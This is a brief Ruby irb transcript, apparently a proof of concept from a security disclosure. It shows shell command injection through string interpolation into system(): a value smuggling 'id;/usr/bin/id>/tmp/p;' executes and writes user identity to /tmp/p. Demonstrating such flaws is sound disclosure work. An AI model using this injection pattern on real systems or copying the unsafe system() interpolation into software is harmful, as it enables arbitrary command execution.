irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
=> "\"id;/usr/bin/id>/tmp/p;\""
irb(main):099:0> system %{/bin/echo "#{ () file}" }
id
sh: 1: : Permission denied
=> false
irb(main):100:0>
larry () underfl0w:/tmp$ cat /tmp/p
uid=1000(larry) gid=600(staff) groups=600(user)
